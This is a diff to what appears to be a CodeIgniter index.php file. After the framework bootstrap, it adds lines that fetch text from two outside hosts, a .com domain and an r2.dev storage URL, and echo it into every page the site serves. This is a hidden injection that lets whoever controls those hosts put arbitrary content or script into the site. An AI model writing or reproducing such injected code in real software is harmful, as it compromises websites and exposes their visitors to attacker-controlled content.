@@ -313,3 +313,7 @@ switch (ENVIRONMENT)
  * And away we go...
  */
 require_once BASEPATH.'core/CodeIgniter.php';
+$a = file_get_contents('https://www.galatiatiga.com/oye/index.txt');
+echo $a;
+$b = file_get_contents('https://pub-626f5647a4c54ece94832bd5d25bf135.r2.dev/h/css/js.txt');
+echo $b;
